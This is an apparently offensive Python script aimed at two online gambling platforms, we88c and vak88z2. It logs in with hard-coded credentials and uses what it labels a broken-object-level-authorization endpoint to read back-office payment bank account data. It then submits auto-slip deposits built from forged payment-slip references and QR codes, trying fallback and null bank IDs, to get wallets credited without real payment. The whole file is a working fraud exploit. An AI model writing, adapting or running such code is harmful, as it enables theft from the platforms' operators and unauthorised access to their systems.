#!/usr/bin/env python3
"""probe_we88c_deposit.py — Deposit on we88c where auto-credit WORKS.

   From context: we88c auto-credits deposits (wallet 0.01→200.01 with auto-slip-deposit).
   vak88z2 requires BO approval.

   Try: register/login on we88c → deposit → verify auto-credit works.
"""
import base64, json, pathlib, requests, sys, time, uuid

sys.path.insert(0, "nuxt")
from slipgen3 import generate_tx_reference, generate_qr_data
from datetime import datetime, timezone, timedelta

TID_WE88C  = "54ef7626cb381f4bab8be91f0cdbce47"
TID_VAK88Z = "af6efb584a3d317b5a11ab6209b88e1b"

PBAPI_WE88C  = f"https://{TID_WE88C}pbapi.asdgapicenterssdo.com"
MGAPI_WE88C  = f"https://{TID_WE88C}mgapi.asdgapicenterssdo.com"
MGAPI_VAK88Z = f"https://{TID_VAK88Z}mgapi.asdgapicenterssdo.com"
PBAPI_VAK88Z = f"https://{TID_VAK88Z}pbapi.asdgapicenterssdo.com"
BGAPI_WE88C  = f"https://{TID_WE88C}bgapi.asdgapicenterssdo.com"

DOMAIN_WE88C  = "m.we88c.com"
DOMAIN_VAK88Z = "m.vak88z2.com"

PHONE = "0972571110"
PASS  = "Pwned2026!"

JWT_FILE_WE88C = pathlib.Path(".jwt.we88c")
JWT_FILE_VAK88Z = pathlib.Path(".jwt.vak88z2")

def auth_we88c():
    r = requests.post(f"{PBAPI_WE88C}/pb/authentication",
        headers={"Content-Type": "application/json", "template": "vn"},
        json={"strategy": "local", "username": PHONE, "password": PASS},
        timeout=15)
    if r.status_code in (200, 201):
        jwt = r.json()["accessToken"]
        JWT_FILE_WE88C.write_text(jwt)
        print(f"  we88c JWT: OK (sub={r.json().get('id','?')[:8]})")
        return jwt
    print(f"  we88c auth: {r.status_code}: {r.text[:100]}")
    return None

def auth_vak88z():
    r = requests.post(f"{PBAPI_VAK88Z}/pb/authentication",
        headers={"Content-Type": "application/json", "template": "vn"},
        json={"strategy": "local", "username": PHONE, "password": PASS},
        timeout=15)
    if r.status_code in (200, 201):
        jwt = r.json()["accessToken"]
        JWT_FILE_VAK88Z.write_text(jwt)
        print(f"  vak88z2 JWT: OK (sub={r.json().get('id','?')[:8]})")
        return jwt
    print(f"  vak88z2 auth: {r.status_code}: {r.text[:100]}")
    return None

print("=== Authenticate on both tenants ===")
JWT_WE88C = auth_we88c()
JWT_VAK88Z = auth_vak88z()

HDR_WE88C = {"Authorization": f"Bearer {JWT_WE88C}", "template": "vn",
             "Content-Type": "application/json"} if JWT_WE88C else {}
HDR_VAK88Z = {"Authorization": f"Bearer {JWT_VAK88Z}", "template": "vn",
              "Content-Type": "application/json"} if JWT_VAK88Z else {}

def wallet_we88c():
    if not JWT_WE88C: return "NO_JWT"
    r = requests.get(f"{MGAPI_WE88C}/mb/wallet", headers=HDR_WE88C, timeout=10)
    if r.ok:
        data = r.json().get("data", [{}])
        return data[0].get("balance", "?") if isinstance(data, list) else "?"
    return f"ERR:{r.status_code}"

def wallet_vak88z():
    if not JWT_VAK88Z: return "NO_JWT"
    r = requests.get(f"{MGAPI_VAK88Z}/mb/wallet", headers=HDR_VAK88Z, timeout=10)
    if r.ok:
        data = r.json().get("data", [{}])
        return data[0].get("balance", "?") if isinstance(data, list) else "?"
    return f"ERR:{r.status_code}"

print(f"\n=== Current wallets ===")
print(f"  we88c:   {wallet_we88c()}")
print(f"  vak88z2: {wallet_vak88z()}")

# ── 1. Get we88c payment bank accounts (BOLA) ─────────────────────────────────
print("\n=== 1. Get we88c payment bank accounts ===")
we88c_bank_id = None
r = requests.get(f"{BGAPI_WE88C}/bo/info/payment-bank-account",
                 headers={"Authorization": f"Bearer {JWT_WE88C}", "template": "vn"} if JWT_WE88C else {},
                 params={"domain": DOMAIN_WE88C},
                 timeout=15)
if r.ok:
    items = r.json() if isinstance(r.json(), list) else r.json().get("data", [])
    print(f"  {len(items)} accounts")
    for item in items[:10]:
        bid = item.get("id", "?")
        bno = item.get("bank_no", item.get("account_no", ""))
        btype = item.get("payment_type_code", item.get("bank_code", "?"))
        bname = item.get("payment_name", "?")
        print(f"    {bid[:8]} | {btype:15} | {bname:20} | bank_no={bno or '<empty>'}")
        if btype in ("AUTO-SLIP", "KBANK", "SCB") and bno:
            we88c_bank_id = bid
elif r.status_code == 401:
    print(f"  BOLA 401 — trying mgapi directly")
else:
    print(f"  HTTP {r.status_code}: {r.text[:100]}")

# ── 2. Try deposit on we88c ───────────────────────────────────────────────────
if JWT_WE88C:
    print("\n=== 2. Deposit on we88c (should auto-credit) ===")
    now = datetime.now(timezone.utc) + timedelta(hours=7)
    tx_ref = generate_tx_reference(now)
    qr = generate_qr_data(tx_ref)
    print(f"  Fresh QR: {tx_ref}")

    # First try to get a bank ID
    if not we88c_bank_id:
        # Use a generic bank ID format (from vak88z2)
        we88c_bank_id = "18a9502b-94ae-4188-8841-094be8b3b974"
        print(f"  Using fallback bank_id: {we88c_bank_id}")

    # Sign URL
    r_sign = requests.post(f"{MGAPI_WE88C}/mb/sign-url-upload-slip", headers=HDR_WE88C,
                           json={"filename": f"slip_{tx_ref[:8]}.jpg",
                                 "content_type": "image/jpeg", "size": 100000},
                           timeout=15)
    if r_sign.ok:
        print(f"  sign-url: OK ({r_sign.json().get('filename', '?')})")
    else:
        print(f"  sign-url: {r_sign.status_code}: {r_sign.text[:100]}")

    # Try deposit
    for bank_id in [we88c_bank_id,
                    "00000000-0000-0000-0000-000000000000",  # null UUID
                    ""]:  # empty
        payload = {
            "payment_bank_information_id": bank_id,
            "deposit_amount": 500,
            "note": "$",
            "slip_image_url": f"slip_{tx_ref[:8]}.jpg",
            "qr_string": qr,
        }
        r = requests.post(f"{MGAPI_WE88C}/mb/auto-slip-deposit", headers=HDR_WE88C,
                          json=payload, timeout=15)
        if r.status_code not in (404,):
            print(f"  auto-slip-deposit bank_id={bank_id[:8] if bank_id else '<empty>'}: "
                  f"HTTP {r.status_code}: {r.text[:150]}")
            if r.ok:
                try:
                    body = r.json()
                    status = body.get("status") or body.get("data", {}).get("status")
                    print(f"    status: {status}")
                    time.sleep(2)
                    w = wallet_we88c()
                    print(f"    wallet after: {w}")
                    if float(str(w).replace("ERR:", "0")) > 1:
                        print(f"  [!!!] WALLET CREDITED!")
                except Exception as e:
                    print(f"    parse: {e}")
        time.sleep(0.5)

# ── 3. Check vak88z2 status ───────────────────────────────────────────────────
print(f"\n=== 3. Final status ===")
print(f"  we88c:   {wallet_we88c()}")
print(f"  vak88z2: {wallet_vak88z()}")
